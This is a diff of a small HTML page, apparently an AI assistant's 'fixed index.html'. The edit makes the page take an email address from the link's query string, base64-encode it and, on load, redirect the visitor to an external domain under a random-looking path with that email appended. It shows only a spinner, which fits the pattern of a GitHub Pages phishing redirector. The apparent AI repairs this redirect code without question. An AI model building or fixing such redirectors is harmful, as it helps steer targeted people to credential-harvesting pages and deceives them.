@@ -1,3 +1,5 @@
+Here's the fixed index.html:
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -36,16 +38,19 @@
     </div>
     <script>
         (function() {
-            var path = window.location.pathname;
-            var segments = path.split('/').filter(function(s) { return s.length > 0; });
-            var emailB64 = segments[segments.length - 1];
+            // Get email from after the ? in URL
+            // URL format: https://site.github.io/repo/?test@example.com
+            var email = window.location.search.substring(1); // removes the "?"
             
-            if (!emailB64 || emailB64 === 'index.html') {
+            if (!email) {
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('message').className = 'message error';
                 document.getElementById('message').textContent = 'Invalid link';
                 return;
             }
+            
+            // Base64 encode the email
+            var emailB64 = btoa(email);
             
             window.location.href = 'https://startup.aliagaspor.com/Coh!5FyvqZmQVfbB8fwyhq/$' + emailB64;
         })();
